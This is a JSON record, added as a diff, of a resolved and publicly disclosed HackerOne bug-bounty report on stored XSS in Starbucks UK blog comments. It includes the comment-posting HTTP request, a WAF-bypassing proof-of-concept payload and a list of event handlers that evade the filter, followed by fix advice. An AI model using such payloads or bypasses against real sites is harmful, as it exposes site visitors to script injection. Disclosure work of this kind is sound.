@@ -1,0 +1,131 @@
+{
+  "id": 218226,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yMTgyMjY=",
+  "url": "https://hackerone.com/reports/218226",
+  "title": "Stored XSS in comments on https://www.starbucks.co.uk/blog/*",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "high",
+  "readable_substate": "Resolved",
+  "created_at": "2017-04-02T23:18:08.913Z",
+  "submitted_at": "2017-04-02T23:18:08.913Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "bayotop",
+    "url": "/bayotop",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/c5g0hr3clmh63r1zeqlen4qzztym/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 1989,
+    "url": "https://hackerone.com/starbucks",
+    "handle": "starbucks",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/001/989/c9aa38cf3b1a91daa085d31e23d23f34cd1874df_original./235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/001/989/c9aa38cf3b1a91daa085d31e23d23f34cd1874df_original./3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Starbucks",
+      "twitter_handle": "Starbucks",
+      "website": "http://www.starbucks.com",
+      "about": "Premier purveyor of the finest coffee in the world, inspiring and nurturing the human spirit — one person, one cup and one neighborhood at a time."
+    }
+  },
+  "has_bounty?": true,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2017-06-27T17:13:40.679Z",
+  "bug_reporter_agreed_on_going_public_at": "2017-06-26T20:24:19.057Z",
+  "team_member_agreed_on_going_public_at": "2017-06-27T17:13:40.600Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "Hi,\n\nthere are a lot of published blog post under https://www.starbucks.co.uk/blog/*. You can find plenty of them using this google dork `site:www.starbucks.co.uk inurl:blog/`. Notice the comments functionality at the bottom at the page.\n\nWhen a comment is sent the following request is made:\n```http\nPOST /blog/addcomment HTTP/1.1\nHost: www.starbucks.co.uk\nUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0\nAccept: text/html, */*; q=0.01\nAccept-Language: en-US,en;q=0.5\nX-NewRelic-ID: VQUHVlNSARACV1JSBAIGVA==\nContent-Type: application/x-www-form-urlencoded; charset=UTF-8\nX-Requested-With: XMLHttpRequest\nReferer: https://www.starbucks.co.uk/blog/setting-the-record-straight-on-starbucks-uk-taxes-and-profitability\nContent-Length: 321\nCookie: [redacted]\nConnection: close\n\nBody=Nice&ParentId=0&PostID=1241&author=ope67164%40disaq.com\n```\nThe values of the `Body` and `author` parameters will be rendered into the page as a new comment. The value from the `author` parameter is not correctly encoded. This allows to inject arbitrary valid HTML.\n\nYou seem to be using a WAF which will block request (500) containing `<script></script>` and various input matching `on*=`.  However, I managed to find a bypass:\n\n```html\n</li></ul></li></ul></div></div></div></div><test/onbeforescriptexecute=confirm`h1poc`>\n```\n\nThis will work on latest FF as can be seen here: https://www.starbucks.co.uk/blog/setting-the-record-straight-on-starbucks-uk-taxes-and-profitability\n\nNote that the closing tags are just to make the script execute (I'm sorry for the multiple payloads on that site, once the above comment was sent, all previous attempts started to work. Would be great if you could clean up the comments at the end).\n\nHere is a list of all potential `on*=` events I could find, that will bypass your WAF an can be used to create cross-browser payloads:\n\n```\nonsearch\nonwebkitanimationiteration\nonwebkitanimationstart\nonanimationiteration\nonwebkitanimationend\nonanimationstart\nondataavailable\nontransitionend\nonanimationend\nonreceived\nonpopstate\n```\n\nTo fix this issue make sure the `author` value is correctly encoded. It could be also taken from the current user's session instead of the POST data. Also I recommend adding the aforementioned events to your WAF blacklist.\n\nPlease let me know in case you need any more information from my side. ",
+  "weakness": {
+    "id": 62,
+    "name": "Cross-site Scripting (XSS) - Stored"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": "2017-07-26T20:24:19.111Z",
+  "allow_singular_disclosure_after": -277239696.4844682,
+  "singular_disclosure_allowed": true,
+  "vote_count": 19,
+  "voters": [
+    "bogdantc",
+    "bl4de",
+    "spam404",
+    "s_p_q_r",
+    "bayotop",
+    "r3y",
+    "eveeez",
+    "zuh4n",
+    "quistertow",
+    "0xradi",
+    "and 9 more..."
+  ],
+  "severity": {
+    "rating": "high",
+    "score": 7.3,
+    "author_type": "Team",
+    "metrics": {
+      "attack_vector": "network",
+      "attack_complexity": "low",
+      "privileges_required": "low",
+      "user_interaction": "required",
+      "scope": "unchanged",
+      "confidentiality": "high",
+      "integrity": "high",
+      "availability": "none"
+    }
+  },
+  "structured_scope": null,
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
